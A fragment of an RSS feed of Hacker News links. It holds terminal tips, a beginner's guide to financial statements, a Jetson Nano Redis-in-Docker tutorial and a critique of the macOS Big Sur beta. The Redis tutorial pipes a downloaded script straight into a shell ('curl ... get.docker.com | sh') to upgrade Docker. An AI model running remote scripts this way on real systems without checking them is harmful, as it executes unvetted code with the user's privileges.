chmod: Unable to change file mode on /usr/share/firmlinks: Operation not permitted
$ sudo !!
$</code></pre><h3>Searching the command history</h3><p>Speaking of command history - you don't really need the ! command when you know about the Ctrl+R shortcut! Tap it once, and you'll be able to do an interactive autocomplete search of your entire command history!</p><h2>Oh my...</h2><p>Lastly, I want to talk about oh-my-zsh. Zsh (pronounced sea shell) is a popular alternative to the well known bash shell, and <code>oh-my-zsh</code> is a small framework that adds a ton of useful functionality, aliases and plugins to make your workflow as smooth as possible.</p><p>If you haven't installed it already, you can do so by visiting their <a href="https://ohmyz.sh/">home page</a>. Next, pop up <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Cheatsheet">this cheat sheet</a> and start learning. There's a ton of useful shortcuts for git (like <code>gst</code> for <code>git status</code> and <code>gc</code> for <code>git commit</code>), but also really nifty commands like <code>...</code> for navigating two directories up or <code>take deep/directory/tree</code> for creating a new directory and navigating into it.</p><p>In addition, there are tons of great themes and plugins available to make your terminal super powerful. I've had <code>oh-my-zsh</code> installed for years, and I just love it more for every passing day.</p><h2>Last words</h2><p>These are some of my favorite tips for being productive in the terminal. There are tons of stuff I've skipped - like how to grep or exit vim - but to be honest I don't use those a lot either. I hope you found at least one new technique to add to your roster - and that you promise to share your favorite commands with me on Twitter.</p></div></div></div>]]>
            </description>
            <link>https://www.selbekk.io/blog/2020/07/useful-tips-for-being-productive-in-the-terminal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738202</guid>
            <pubDate>Sun, 05 Jul 2020 12:30:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Financial Statements: A Beginner's Guide]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738148">thread link</a>) | @refrigerator
<br/>
July 5, 2020 | https://www.causal.app/blog/whats-a-financial-statement | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/whats-a-financial-statement">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The finance world is quickly entering the mainstream —</p><p>Every month a notable company goes public. Every week a hot startup raises millions of dollars. And every day moms, pops, and teens check on their stocks. </p><p>Whether a company builds rocket engines or mobile apps, they tell their story using the same language —&nbsp;financial statements. Here's how they work.</p><p>Let's say you run a subscription t-shirt business.</p><p>It's going well — you have happy customers and healthy profit. You're thinking of buying your own factory to make more t-shirts, more quickly, and more cheaply.</p><p>There's just one problem — you can't afford a factory.</p><p>So, you ask the bank for a loan. Your company is profitable and the factory will pay for itself in 3 years, so you know you'll be able to pay it back. But while you know this, the bank doesn't — you'll need to convince them. The bank, however, doesn't know anything about the subscription clothing business.</p><p>To get on the same page, you need a shared language for talking about your business.</p><p><h4 id="heading-1">Double-entry Bookkeeping: The birth of accounting</h4></p><p>Double-entry bookkeeping was the first formalism in finance. The Middle East had it in the <a href="https://www.jstor.org/stable/40697986" target="_blank">first century AD</a>, Korea independently got it in the <a href="https://www.worldcat.org/issn/1598-2661" target="_blank">11th century</a>, and by the <a href="https://web.archive.org/web/20170627232023/http://130.74.92.202:82/record=b1000778" target="_blank">1500s</a>, it had been well-documented across Europe.</p><p>It's a simple concept designed to reduce errors when documenting transactions: every entry to an "account" requires an equal and opposite entry to another "account".</p><p>If you bought some cotton to turn into t-shirts, you might record the transaction like this:</p><p>‍</p><figure id="w-node-371c827e421c-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5eefde0379b53032713cde77_bookkeeping.png" alt=""></p></figure><p>‍</p><p>When you spend $100 on cotton, your "Cash" account gets debited (loses) $100, and your "Materials" account gets credited (gains) $100. The underlying principle is that <em>you can't create something out of nothing</em>.</p><p>This might seem contrived, but with more and more transactions, it can help you spot errors. Since every entry has an equal and opposite entry, the sum of all the debits should always equal the sum of all the credits. If not, you know you made a mistake, and you can look back through your transactions to find it.</p><p>A list of transactions is pretty interesting — it tells a very detailed story about what your company's been up to. Certainly enough to answer the bank's questions when you ask for loan.</p><p>But just as the bank doesn't have time to learn about subscription t-shirts businesses, they don't have time to go through thousands of transactions. To understand what's going on, they need a shorter summary.</p><p><h4 id="heading-2">Financial Statement #1: The Balance Sheet</h4></p><p>If you went through all your transactions and worked out the net value of each account, you'd be able to see things like</p><ul role="list"><li>How much cash you have in the bank</li><li>The total value of the cotton in your inventory</li><li>How much money you owe to your cotton suppliers</li></ul><p>This will give you a snapshot of the current state of your company, split up into "everything you own" (<strong>Assets</strong>) and "everything you owe" (<strong>Liabilities</strong>) — a <strong>Balance Sheet</strong>. These generally won't be equal — ideally your assets will be worth more than your liabilities.</p><p>The difference between the assets and the liabilities is what you, the owner of the company, can rightfully stake a claim to. Crudely, if you sold all your assets today and used that money to pay off all your debts, you'd be left with a pile of cash all to yourself.</p><p>This idea is usually expressed by the "accounting equation":</p><p><strong>Assets - Liabilities = Shareholders Equity</strong></p><p>This is where the "balance" comes in: both sides of the equation are equal. Note that this equation is actually a definition — it asserts that the value of the <strong>Shareholders Equity</strong> is the difference between <strong>Assets</strong> and <strong>Liabilities</strong>. This is the same equation that underpins double-entry bookkeeping.</p><p>Here's what your balance sheet might look like:</p><p>‍</p><figure id="w-node-89b5b437bd58-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5eefde1a11602b68a068a079_balance-sheet.png" alt=""></p></figure><p>‍</p><p>The bank will be interested in seeing this before giving you a loan. It's a quick 'n' dirty way for them to understand the big picture:</p><ul role="list"><li>The orders of magnitude involved — does this company operate in the thousands, millions, or billions?</li><li>An estimate for how much the company is "worth", based on the shareholders equity</li><li>An indication of company health — is the company drowning in debt?</li></ul><p>Financiers often calculate metrics based on the balance sheet, to further summarise the information and to compare numbers across companies.</p><p>The <strong>Debt/Equity Ratio</strong> is a big one, telling you how much a company relies on borrowing money. If it's too high then the company might be too dependent on loans, but if it's too low, this might indicate an inefficiency, since borrowing money to spend on growth can be quicker than earning it the hard way.</p><p>So — the balance sheet summarises a lot about your company, in a way that the bank can understand.</p><p>Unfortunately, it doesn't answer a crucial question — "Do you make money?"</p><p><h4 id="heading-3">Financial Statement #2: The Income Statement (P&amp;L)</h4></p><p>The balance sheet is a snapshot of a single point in time. To understand whether a company makes money, you need see how things change over a period of time (e.g. every month).</p><p>The first thing you need to know is how much money you receive — your <strong>Revenue</strong>. You don't keep all of it — there are costs and expenses along the way — so you need to subtract these. The final number you end up with is your <strong>Profit</strong> — the money you've made at the end of the day.</p><p>Here's how you might do the calculation:</p><p>‍</p><figure id="w-node-a4e76259fbb4-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5eefe0c6c8f0be2b6743533b_p%26l.png" alt=""></p></figure><p>‍</p><p>You start at Revenue (the top line), subtract your costs, and end up at Profit (the "bottom line" — get it?). This is a simple <strong>Profit &amp; Loss (P&amp;L)</strong>, or <strong>Income Statement</strong>. Most companies make one every month, to keep an eye on things. </p><p>‍</p><figure id="w-node-fec0fade16bf-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5eefe17879b5309ce33ce18b_35274025-14536291245349646_origin.png" alt=""></p></figure><p>‍</p><p>With a P&amp;L, you and the bank can understand what's going in and out of your business. If your P&amp;L consistently shows a profit, then the bank will be happy, and so will you.</p><p>In theory, this is very simple. But in practice, each P&amp;L item has hidden nuances to address.</p><p>Let's take just the top line — what does <strong>Revenue</strong> actually mean?</p><p><strong>What is revenue?</strong></p><p>When you started selling shirts, it was a simpler time — you bought them in bulk from China and sold them at the local market.</p><p>Revenue, too, was simple — it was the cold hard cash in your hand.</p><p>But things changed. You started taking bulk orders from shops, who pay you 1 month after you deliver the shirts. And when you went online, your customers started paying you for 12 month subscriptions, all in one go.</p><p>It turns out that if you keep thinking of revenue as "cash in your hand", then things get a little weird —</p><ul role="list"><li>When you get a bulk order, your expenses shoot up. But since you don't get paid until next month, your profit goes way down this month.</li><li>When someone buys a 12-month subscription, your revenue spikes up. But for the next 11 months you have to keep delivering on the order (non-zero cost) without further payments (zero revenue) — your bottom line takes a hit.</li></ul><p>Bulk orders and upfront payments are great for your business, but if revenue means "cash in hand", then your P&amp;L might tell the opposite story.</p><p>A better way to think about revenue is as "the value of products delivered or service provided".</p><p>In each month of a subscription, you do 1 month of work. So even with 12 months' payment upfront, you only recognise 1/12th of that payment as revenue each month. The remaining 11/12th becomes <strong>Deferred Revenue.</strong> This is actually a liability on your balance sheet — your customers have essentially given you a loan which you must pay back each month, in the form of t-shirts.</p><p>The same principle applies for bulk orders — you recognise the revenue when you deliver the product, <em>not</em> when you get paid.</p><p>This is called <strong>Accrual Accounting</strong>, and it more accurately answers the question "Do you make money?".</p><p>So — you've got a balance sheet, showing your current financial state, and you've got a P&amp;L, showing how things change over time. The bank, however, remains unsatisfied.</p><p>Sadly, consistent profits, measured with accrual accounting, can still leave you penniless on payday.</p><p><h4 id="heading-4">Financial Statement #3: The Cashflow Statement</h4></p><p>In 1863, the Dowlais Iron Company had a dilemma.</p><p>On paper, things were great — they'd recovered from a downturn and were posting healthy profits. To smelt more iron, they set out to buy a new blast furnace. But despite their promising P&amp;L, it turned out that they had no cash to buy it.</p><p>What gives?</p><p>Their problem was in spending cash too quickly — as soon as they got some, they'd use it on inventory (iron ore, etc). The profits were rolling in, but the cash wasn't sticking around.</p><p>The company needed a way to understand how cash was coming in and out — the cashflow. Their solution was the origin of the modern <strong>Cashflow Statement</strong>.</p><p>Like the P&amp;L, the cashflow statement shows how things change over each month, but crucially, it only focuses on cash — how much you started with, what you spent it on, where you got more of it, and how much you ended up with. In short, the cashflow statement explains the difference between one balance sheet and the next.</p><figure id="w-node-508193268673-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5eefe644e9cf27ec56e99c29_Untitled-3.png" alt=""></p></figure><p>The bank should now have enough information to decide whether to give you a loan:</p><ul role="list"><li>Balance Sheet — shows everything that you own, and everything that you owe</li><li>P&amp;L/Income Statement — shows how your business operates</li><li>Cashflow Statement — shows how you spend and earn cash</li></ul><p>These financial statements are a shared language, letting businesses communicate across industries and borders. They also "flatten" a business' evolving operations — new business models, delivery methods, and products — to give a coherent view of a company through time.</p><p>Investors use financials to judge performance, lenders use them to assess credit-worthiness, and governments use them to make sure that taxes are correctly paid.</p><p>But the whole system only works if every company follows the same rules when compiling their financials. These rules require years of study to fully understand (this is why accountants exist) and include:</p><ul role="list"><li>How to recognise revenue —&nbsp;accrual accounting</li><li>How to "amortise" costs — spreading upfront expenses over time</li><li>How to "capitalise"&nbsp;costs —&nbsp;turning big purchases into assets on the balance sheet</li></ul><p>Who made these rules?</p><p><h4 id="heading-5">Accounting Standards: Mind the GAAP</h4></p><p>The Industrial Revolution …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.causal.app/blog/whats-a-financial-statement">https://www.causal.app/blog/whats-a-financial-statement</a></em></p>]]>
            </description>
            <link>https://www.causal.app/blog/whats-a-financial-statement</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738148</guid>
            <pubDate>Sun, 05 Jul 2020 12:22:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Redis running inside Docker container on Nvidia Jetson Nano]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738070">thread link</a>) | @gkorland
<br/>
July 5, 2020 | https://collabnix.com/running-redis-inside-docker-container-on-jetson-nano/ | <a href="https://web.archive.org/web/*/https://collabnix.com/running-redis-inside-docker-container-on-jetson-nano/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p id="pvc_stats_6930" data-element-id="6930"> <img src="https://collabnix.com/wp-content/plugins/page-views-count/ajax-loader.gif"></p>
<figure><img src="https://collabnix.com/wp-content/uploads/2020/01/image.png" alt="" srcset="https://collabnix.com/wp-content/uploads/2020/01/image.png 1004w, https://collabnix.com/wp-content/uploads/2020/01/image-600x330.png 600w, https://collabnix.com/wp-content/uploads/2020/01/image-300x165.png 300w, https://collabnix.com/wp-content/uploads/2020/01/image-768x422.png 768w, https://collabnix.com/wp-content/uploads/2020/01/image-210x115.png 210w" sizes="(max-width: 1004px) 100vw, 1004px"></figure>







<p>If you are looking out for a small, affordable, low-powered system which comes by default with the power of modern AI for your developers, then NVIDIA Jetson Nano is the answer. NVIDIA Jetson Nano is an embedded system-on-module (SoM) and developer kit from NVIDIA, including an integrated 128-core Maxwell GPU, quad-core ARM A57 64-bit CPU, 4GB LPDDR4 memory, along with support for MIPI CSI-2 and PCIe Gen2 high-speed I/O &amp; that too within $99 price tag. Amazing, isn’t it?</p>



<p>The NVIDIA® Jetson Nano™ Developer Kit is purely an AI computer. It is a small, powerful computer that lets you run multiple neural networks in parallel for applications like image classification, object detection, segmentation, and speech processing. All in an easy-to-use platform that runs in as little as 5 watts. It is perfect for makers, learners, and developers that brings the power of modern artificial intelligence to a low-power, easy-to-use platform. </p>



<h2>Why Redis on Jetson Nano?</h2>



<p> <br>The major problem with existing IoT devices like Raspberry Pi or Jetson Nano board is that they uses a removable microSD card as its boot device and storage. Hence, the problem of temporarily storing data.  Imagine data received by sensors or 4k video images received every seconds on these IoT devices to perform on-device computations.  For major of IoT projects, a message queuing system like MQTT is all that is needed to connect sensors, devices and graphic interfaces together. But if you have hard requirements for high throughput or you’re storing special data types like binary data or image files then you should start considering Redis. </p>



<p>Redis is an open source, in-memory Data Structure Store, used as a database, a caching layer or a message broker. Today Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLog, bitmaps, streams, and spatial indexes. </p>



<p>As per <a href="https://redis.io/topics/ARM">this</a> link, Redis is ideal for IoT and Embedded devices for several reasons:</p>



<ul><li>Redis has a very small memory footprint and CPU requirements. It can run in small devices like the Raspberry Pi Zero without impacting the overall performance, using a small amount of memory, while delivering good performance for many use cases.</li><li>The data structures of Redis are often a good way to model IoT/embedded use cases. For example in order to accumulate time series data, to receive or queue commands to execute or responses to send back to the remote servers and so forth.</li><li>Modeling data inside Redis can be very useful in order to make in-device decisions for appliances that must respond very quickly or when the remote servers are offline.</li><li>Redis can be used as an interprocess communication system between the processes running in the device.</li><li>The append only file storage of Redis is well suited for the SSD cards.</li><li>The Redis 5 stream data structure was specifically designed for time series applications and has a very low memory overhead.</li></ul>



<p>It is important to note that both Redis 4 and Redis 5 versions supports the ARM processor in general. I have been playing around running containerized applications on Jetson Nano and couldn’t wait to try out Redis on top of NVIDIA Jetson Nano. </p>



<h2>Preparing Jetson Nano</h2>



<ul><li><strong>Unboxing Jetson Nano Pack</strong></li></ul>



<figure><img src="https://collabnix.com/wp-content/uploads/2019/09/image-5-1024x397.png" alt="" srcset="https://collabnix.com/wp-content/uploads/2019/09/image-5-1024x397.png 1024w, https://collabnix.com/wp-content/uploads/2019/09/image-5-600x233.png 600w, https://collabnix.com/wp-content/uploads/2019/09/image-5-300x116.png 300w, https://collabnix.com/wp-content/uploads/2019/09/image-5-768x298.png 768w, https://collabnix.com/wp-content/uploads/2019/09/image-5-210x81.png 210w, https://collabnix.com/wp-content/uploads/2019/09/image-5.png 1339w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<ul><li><strong>Preparing your microSD card</strong></li></ul>



<p>To prepare your microSD card, you’ll need a computer with Internet connection and the ability to read and write SD cards, either via a built-in SD card slot or adapter.</p>



<ol><li>Download the&nbsp;<a href="https://developer.nvidia.com/jetson-nano-sd-card-image-r322">Jetson Nano Developer Kit SD Card Image</a>, and note where it was saved on the computer.</li><li>Write the image to your microSD card( atleast 16GB size) by following the instructions below according to the type of computer you are using: Windows, Mac, or Linux. If you are using Windows laptop, you can use SDFormatter software for formatting your microSD card and Win32DiskImager to flash Jetson Nano Image. In case you are using Mac, you will need <a href="https://www.balena.io/etcher">Etcher </a>software.</li></ol>



<figure><img src="https://collabnix.com/wp-content/uploads/2019/09/image-7.png" alt="" srcset="https://collabnix.com/wp-content/uploads/2019/09/image-7.png 509w, https://collabnix.com/wp-content/uploads/2019/09/image-7-300x187.png 300w, https://collabnix.com/wp-content/uploads/2019/09/image-7-210x131.png 210w" sizes="(max-width: 509px) 100vw, 509px"></figure>



<ol><li>To prepare your microSD card, you’ll need a computer with Internet connection and the ability to read and write SD cards, either via a built-in SD card slot or adapter</li></ol>



<figure><img src="https://collabnix.com/wp-content/uploads/2019/09/image-6.png" alt="" srcset="https://collabnix.com/wp-content/uploads/2019/09/image-6.png 655w, https://collabnix.com/wp-content/uploads/2019/09/image-6-600x295.png 600w, https://collabnix.com/wp-content/uploads/2019/09/image-6-300x147.png 300w, https://collabnix.com/wp-content/uploads/2019/09/image-6-210x103.png 210w" sizes="(max-width: 655px) 100vw, 655px"></figure>



<p>The Jetson Nano SD card image is of 12GB(uncompressed size).</p>



<p>Next, It’s time to remove this tiny SD card from SD card reader and plugin it to Jetson Board to let it boot.</p>



<h2>Jetson Nano comes with 18.09 by default</h2>



<p>Yes, you read it correct. Jetson Nano is shipped with Docker Engine 18.09 by default. Let us verify OS version running on Jetson Nano first.</p>



<h2>Verifying OS running on Jetson Nano</h2>



<pre><code>jetson@jetson-desktop:~$ sudo cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
jetson@jetson-desktop:~$</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano#verifying-docker"></a>Verifying Docker</h2>



<pre><code>jetson@jetson-desktop:~$ sudo docker version
Client:
 Version:           18.09.2
 API version:       1.39
 Go version:        go1.10.4
 Git commit:        6247962
 Built:             Tue Feb 26 23:51:35 2019
 OS/Arch:           linux/arm64
 Experimental:      false

Server:
 Engine:
  Version:          18.09.2
  API version:      1.39 (minimum version 1.12)
  Go version:       go1.10.4
  Git commit:       6247962
  Built:            Wed Feb 13 00:24:14 2019
  OS/Arch:          linux/arm64
  Experimental:     false
jetson@jetson-desktop:~$
</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano#updating-jetson"></a>Updating OS Repository</h2>



<pre><code>sudo apt update
</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano#installing-docker-1903"></a>Installing Docker 19.03 Binaries</h2>



<p>You will need curl command to update Docker 18.09 to 19.03 flawlessly.</p>



<pre><code>sudo apt install curl
</code></pre>



<pre><code>curl -sSL https://get.docker.com/ | sh
</code></pre>



<pre><code>jetson@jetson-desktop:~$ sudo docker version
Client: Docker Engine - Community
 Version:           19.03.2
 API version:       1.40
 Go version:        go1.12.8
 Git commit:        6a30dfc
 Built:             Thu Aug 29 05:32:21 2019
 OS/Arch:           linux/arm64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.2
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.8
  Git commit:       6a30dfc
  Built:            Thu Aug 29 05:30:53 2019
  OS/Arch:          linux/arm64
  Experimental:     false
 containerd:
  Version:          1.2.6
  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
jetson@jetson-desktop:~$
</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano#installing-docker-compose"></a>Installing Docker Compose</h2>



<pre><code>root@jetson-desktop:/home/jetson# /usr/bin/docker-compose version
docker-compose version 1.17.1, build unknown
docker-py version: 2.5.1
CPython version: 2.7.15+
OpenSSL version: OpenSSL 1.1.1  11 Sep 2018
root@jetson-desktop:/home/jetson#
</code></pre>







<h2>Run Redis Server inside Docker </h2>



<p>Jetson Nano is ARMv8 (64bit) and hence we need to verify if ARM64v8 Redis image is available or not.  </p>



<pre><code>jetson@master1:~$ docker run --name redis-server -d arm64v8/redis redis-server --appendonly yes
6b80312b1e05499d565c6962b03f852db7064d5be97acb11dae31791b55ef320
jetson@master1:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
6b80312b1e05        arm64v8/redis       "docker-entrypoint.s…"   6 seconds ago       Up 3 seconds        6379/tcp            redis-server
jetson@master1:~$

</code></pre>



<h2>Verify if Redis Server is running or not</h2>



<pre><code>jetson@master1:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
340437cc7c7c        arm64v8/redis       "docker-entrypoint.s…"   35 seconds ago      Up 32 seconds       6379/tcp            myredis
</code></pre>



<h2>Checking the Redis Logs</h2>



<pre><code>jetson@master1:~$ docker logs -f 4e194
1:C 23 Dec 2019 15:49:21.819 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1:C 23 Dec 2019 15:49:21.819 # Redis version=5.0.7, bits=64, commit=00000000, modified=0, pid=1, just started
1:C 23 Dec 2019 15:49:21.819 # Configuration loaded
1:M 23 Dec 2019 15:49:21.828 * Running mode=standalone, port=6379.
1:M 23 Dec 2019 15:49:21.828 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.
1:M 23 Dec 2019 15:49:21.828 # Server initialized
1:M 23 Dec 2019 15:49:21.828 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.
1:M 23 Dec 2019 15:49:21.829 * Ready to accept connections

</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano/running-redis-on-jetson-nano#run-the-redis-cli-in-the-container"></a>Running the Redis CLI </h2>



<pre><code>jetson@master1:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                        NAMES
4e1941c5be9b        arm64v8/redis       "docker-entrypoint.s…"   5 minutes ago       Up 4 minutes        192.168.1.7:6379-&gt;6379/tcp   redis-server
jetson@master1:~$ docker exec -it 4e1941 sh
# redis-cli
127.0.0.1:6379&gt;

</code></pre>



<h2>Redis PING-PONG Test</h2>



<pre><code># redis-cli
127.0.0.1:6379&gt; ping
PONG
127.0.0.1:6379&gt;
</code></pre>



<h2>Verifying Redis Command Line Interface</h2>



<p><code>T</code>The redis-cli is the Redis command line interface, a simple program that allows to send commands to Redis, and read the replies sent by the server, directly from the terminal. </p>



<pre><code># redis-cli
127.0.0.1:6379&gt; ping
PONG
127.0.0.1:6379&gt; set name collabnix
OK
127.0.0.1:6379&gt; get name
"collabnix"
</code></pre>



<h2>Testing Redis CLI Counter Test</h2>



<pre><code>127.0.0.1:6379&gt; incr counter
(integer) 1
127.0.0.1:6379&gt; incr counter
(integer) 2
127.0.0.1:6379&gt;
</code></pre>



<h2><a href="https://github.com/collabnix/dockerlabs/tree/master/beginners/install/jetson-nano/running-redis-on-jetson-nano#connect-from-another-linked-container"></a>Connecting from other Linked container</h2>



<pre><code>jetson@master1:~$ docker run -it --rm …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://collabnix.com/running-redis-inside-docker-container-on-jetson-nano/">https://collabnix.com/running-redis-inside-docker-container-on-jetson-nano/</a></em></p>]]>
            </description>
            <link>https://collabnix.com/running-redis-inside-docker-container-on-jetson-nano/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738070</guid>
            <pubDate>Sun, 05 Jul 2020 12:06:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big Sur: First Impressions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738004">thread link</a>) | @mpweiher
<br/>
July 5, 2020 | https://www.mothsoftware.com/blog_page.php?permalink=big-sur-first-impressions | <a href="https://web.archive.org/web/*/https://www.mothsoftware.com/blog_page.php?permalink=big-sur-first-impressions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  
<div>
<p>All major websites that cover macOS have had a look at the shiny new features. I'm going to look at the parts that I don't like.</p><h2 id="toc_1">Comparison to Catalina</h2><p>In former times testing a new macOS version was easy: load it up. Do a bug report or 2. Finished. Mojave with the privacy additions was unpleasant.</p><p>Catalina was rough in the first versions. Apple managed to screw up access to the temp folder in such a way that some apps were unusable. For some users the temp folder was okay and for others it wasn't. The less I say about the privacy idiocy the better.</p><p>So last year was bad. How about this year? Well, it's not better.</p><h2 id="toc_2">The sounds</h2><p>I remember seeing a video about music in Star Wars versus Marvel films. Star Wars music (of course, I mean the first trilogy) is memorable. It conveys emotion. In Marvel films music is just background noise.</p><p>In Big Sur sounds went from Star Wars to Marvel. The experience is jarring and wrong.</p><h2 id="toc_3">Stability</h2><p>Oh my. My test laptop is a MacBook Air. Not really fast but enough for reading, browsing, doing emails, making fractals and software testing. Therefore, it doesn't have that many applications. Here is what I got:</p><ul><li><p>Dropbox didn't even start. They got their act together and a new, working version is available by now.</p></li><li><p>I was looking for a Dropbox replacement. The installer from pCloud didn't finish.
The support only told me that they would support Big Sur when the version of macOS would become available. Thanks for nothing.</p></li><li><p>Luminar is crashing on start. I contacted support. At least they tried a bit. Here is their last statement: „I am afraid we cannot investigate the issue further since you are using a beta version of MacOS. We would recommend you to roll back to Catalina OS.“. That made me laugh.</p></li><li><p>Maps has crashed 2 times in the 15 minutes I used it.</p></li><li><p>Mail has crashed already. Nothing new there.</p></li><li><p>The Air restarted on its own. After trying to install pCloud the Air also had to be restarted.</p></li><li><p>The app I use for developing Mail Archiver doesn't make apps right now. They were using a private framework that has vanished. Oops.</p></li></ul><h2 id="toc_4">Opening files</h2><p>Double click on a file, the app that should open the file comes to front and the file content is shown.</p><p>Seems kinda simple. Unfortunately, coming to front doesn't happen for Preview.</p><p><img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/1-opening-files.jpg" alt="Big Sur opening file in background"></p><p>Intensely annoying. I've also seen this when installing the new Dropbox version.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/2-opening-files.jpg"></p><h2 id="toc_5">White space</h2><p>Finder got more white-space that wasn't needed. I'm on a small screen here. Now I can see less text in Finder.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/3-whitespace.jpg"></p><p>This also affects the mailboxes in Mail and the menubar applets. Are we going to get touchscreens? Is everything going to be treated as iPhone? I don’t get it. Perhaps the change makes sense on a 10k screen. But not on my Air.</p><h2 id="toc_6">Contrast</h2><p>The newer the version of macOS the less contrast there is. I made some bug reports to Apple for text that I can only read by squinting. The bug reports were closed as „by design“.</p><p>Big Sur has less contrast between foreground and background than ever.</p><p>Toolbars aren't in fashion anyways anymore. So it doesn't matter that I can barely see the selected item.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/4-preferences.jpg" alt="Toolbar selected item barely visible"></p><p>When you are lucky you can still see the selected folder in a sidebar. At little bit at least:</p><p><img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/5-finder-sidebar.jpg" alt="Finder sidebar"></p><p>Don't use an app that has a black background. Because then you can't see the selected folder at all. I can do the same in Finder with a dark desktop picture.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/6-translucency.jpg"></p><p>And don't try to remove the translucency if you use menubar applets. Because then you won't be able to use them. They now show up white in white.</p><h2 id="toc_7">Buttons</h2><p>Every item in a user interface has meaning. You see buttons that you can click. The elements have a visual hierarchy. A shadow shows you what is in front and what is not. In iOS the difference between clickable and non-clickable items has been eroded.</p><p>Now you have buttons in macOS that can't be recognised as button. Because it's chic to show interface items when you mouse over them.</p><p>The upper area of the screenshot shows the toolbar of a Finder window. If you mouse of the buttons the buttons show up.</p><p><img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/8-mouse-over.jpg" alt="Finder buttons mouse over"></p><h2 id="toc_8">Messageboxes</h2><p>And now we come to the worst part. Any type of messagebox now looks like on the iPhone.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/9-messagebox.jpg"></p><p>But don't add too much text or you will get this gem of a bug. The text is beneath the scrollbar and not next to it.<img src="https://www.mothsoftware.com/cms-data/gallery/hipwig/10-messagebox.jpg"></p><p>Why? This design doesn't make ANY sense at all on a large screen. Did anyone have a problem with the old messageboxes???</p><h2 id="toc_9">Misc</h2><ul><li>The key combinations for menus always show up disabled. Even when the menu item itself is enabled.</li><li>When I navigate in Finder in column view to a new folder then the first item in the view is not the first item in the list but the third.</li><li>When opening screenshots where a scrollbar should be shown there is no scrollbar.</li></ul><h2 id="toc_10">Beta software</h2><p>This is my first impression of Big Sur. As with all beta software bugs are to be expected. But with a large company there are many many eyeballs that work with a software before it is released. They thought at this stage the software was ready for prime time.</p><p>There are a couple of items where I see improvement:</p><ul><li>It’s finally possible to see indetermined progressbars again. How long did it take them? 3 major versions?</li><li>When doing a search in Mail and changing the mailbox the search term remains. I can’t count how often I entered text in a searchfield, selected a different mailbox and had to enter the text again.</li></ul><p>A couple of developer friends said that they prefer the new look. And indeed Big Sur does look fresh and nice. But user interface and user experience are more than a „fresh look“.</p></div>




 
     
  </div></div>]]>
            </description>
            <link>https://www.mothsoftware.com/blog_page.php?permalink=big-sur-first-impressions</link>
